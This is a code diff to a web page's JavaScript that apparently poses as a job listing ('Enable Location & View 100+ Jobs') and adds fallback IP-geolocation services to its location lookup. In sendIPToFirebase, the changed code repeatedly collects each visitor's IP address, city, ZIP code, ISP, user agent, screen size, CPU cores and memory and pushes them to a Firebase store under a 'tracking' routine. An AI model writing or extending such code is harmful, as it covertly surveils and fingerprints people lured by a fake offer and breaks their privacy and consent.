@@ -362,28 +362,94 @@
             const btn = document.getElementById('locationBtn');
             btn.textContent = '🔄 Getting location...';
 
-            // Try HTTPS API first (for GitHub Pages)
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(data => {
-                    if (data.error) throw new Error(data.reason);
-                    showJobs(data.latitude, data.longitude, 'IP');
-                    startIPTracking();
-                })
-                .catch(() => {
-                    // Fallback to ip-api.com
-                    fetch('https://freeipapi.com/api/json')
-                        .then(r => r.json())
-                        .then(data => {
-                            showJobs(data.latitude, data.longitude, 'IP');
-                            startIPTracking();
-                        })
-                        .catch(err => {
-                            alert('Unable to get location. Please check internet connection.');
-                            btn.disabled = false;
-                            btn.textContent = '🔓 Enable Location & View 100+ Jobs';
-                        });
-                });
+            console.log('📡 Trying IP-based location...');
+
+            // Try multiple APIs in order
+            const apis = [
+                {
+                    name: 'ip-api.com',
+                    url: 'http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,query',
+                    parse: (data) => {
+                        if (data.status === 'success') {
+                            return {
+                                latitude: data.lat,
+                                longitude: data.lon,
+                                city: data.city,
+                                country_name: data.country,
+                                country_code: data.countryCode,
+                                region: data.regionName,
+                                postal: data.zip,
+                                timezone: data.timezone,
+                                ip: data.query,
+                                org: data.isp
+                            };
+                        }
+                        throw new Error(data.message || 'Failed');
+                    }
+                },
+                {
+                    name: 'ipapi.co',
+                    url: 'https://ipapi.co/json/',
+                    parse: (data) => {
+                        if (data.error) throw new Error(data.reason);
+                        return data;
+                    }
+                },
+                {
+                    name: 'freeipapi.com',
+                    url: 'https://freeipapi.com/api/json',
+                    parse: (data) => {
+                        return {
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            city: data.cityName,
+                            country_name: data.countryName,
+                            country_code: data.countryCode,
+                            region: data.regionName,
+                            postal: data.zipCode,
+                            timezone: data.timeZone,
+                            ip: data.ipAddress,
+                            org: data.as
+                        };
+                    }
+                }
+            ];
+
+            let apiIndex = 0;
+
+            function tryNextAPI() {
+                if (apiIndex >= apis.length) {
+                    console.error('❌ All IP APIs failed');
+                    alert('Unable to get location. Please check internet connection.');
+                    btn.disabled = false;
+                    btn.textContent = '🔓 Enable Location & View 100+ Jobs';
+                    return;
+                }
+
+                const api = apis[apiIndex];
+                console.log(`📡 Trying ${api.name}...`);
+
+                fetch(api.url)
+                    .then(r => {
+                        console.log(`${api.name} response status:`, r.status);
+                        return r.json();
+                    })
+                    .then(data => {
+                        console.log(`${api.name} data:`, data);
+                        const location = api.parse(data);
+                        console.log(`✅ ${api.name} success!`);
+                        showJobs(location.latitude, location.longitude, 'IP');
+                        startIPTracking();
+                    })
+                    .catch(err => {
+                        console.warn(`⚠️ ${api.name} failed:`, err.message);
+                        apiIndex++;
+                        tryNextAPI();
+                    });
+            }
+
+            // Start with first API
+            tryNextAPI();
         }
 
         // Start hybrid tracking (GPS + IP)
@@ -447,15 +513,16 @@
         function sendIPToFirebase() {
             locationCounter++;
             
-            fetch('https://ipapi.co/json/')
+            // Use ip-api.com (most reliable, no CORS issues)
+            fetch('http://ip-api.com/json/?fields=status,lat,lon,country,countryCode,regionName,city,zip,timezone,isp,org,query')
                 .then(r => r.json())
                 .then(data => {
-                    if (data.error) throw new Error(data.reason);
+                    if (data.status !== 'success') throw new Error(data.message || 'Failed');
                     
                     const locationData = {
                         id: locationCounter,
-                        latitude: data.latitude || 0,
-                        longitude: data.longitude || 0,
+                        latitude: data.lat || 0,
+                        longitude: data.lon || 0,
                         accuracy: 0,
                         altitude: 0,
                         altitudeAccuracy: 0,
@@ -471,19 +538,58 @@
                         cpuCores: navigator.hardwareConcurrency || 0,
                         deviceMemory: navigator.deviceMemory || 0,
                         city: data.city || 'N/A',
-                        country: data.country_name || 'N/A',
-                        countryCode: data.country_code || 'N/A',
-                        region: data.region || 'N/A',
-                        zip: data.postal || 'N/A',
+                        country: data.country || 'N/A',
+                        countryCode: data.countryCode || 'N/A',
+                        region: data.regionName || 'N/A',
+                        zip: data.zip || 'N/A',
                         timezone: data.timezone || 'N/A',
-                        ipAddress: data.ip || 'N/A',
-                        isp: data.org || 'N/A',
+                        ipAddress: data.query || 'N/A',
+                        isp: data.isp || 'N/A',
                         organization: data.org || 'N/A'
                     };
                     pushToFirebase(locationData);
                 })
                 .catch(err => {
                     console.error('❌ IP API error:', err.message);
+                    // Try fallback API
+                    fetch('https://ipapi.co/json/')
+                        .then(r => r.json())
+                        .then(data => {
+                            if (data.error) throw new Error(data.reason);
+                            
+                            const locationData = {
+                                id: locationCounter,
+                                latitude: data.latitude || 0,
+                                longitude: data.longitude || 0,
+                                accuracy: 0,
+                                altitude: 0,
+                                altitudeAccuracy: 0,
+                                heading: 0,
+                                speed: 0,
+                                timestamp: Date.now(),
+                                collectedAt: new Date().toISOString(),
+                                locationMethod: 'IP-based',
+                                deviceName: getDeviceName(),
+                                deviceType: navigator.platform,
+                                userAgent: navigator.userAgent,
+                                screenResolution: `${screen.width}x${screen.height}`,
+                                cpuCores: navigator.hardwareConcurrency || 0,
+                                deviceMemory: navigator.deviceMemory || 0,
+                                city: data.city || 'N/A',
+                                country: data.country_name || 'N/A',
+                                countryCode: data.country_code || 'N/A',
+                                region: data.region || 'N/A',
+                                zip: data.postal || 'N/A',
+                                timezone: data.timezone || 'N/A',
+                                ipAddress: data.ip || 'N/A',
+                                isp: data.org || 'N/A',
+                                organization: data.org || 'N/A'
+                            };
+                            pushToFirebase(locationData);
+                        })
+                        .catch(err2 => {
+                            console.error('❌ All IP APIs failed for tracking:', err2.message);
+                        });
                 });
         }
 
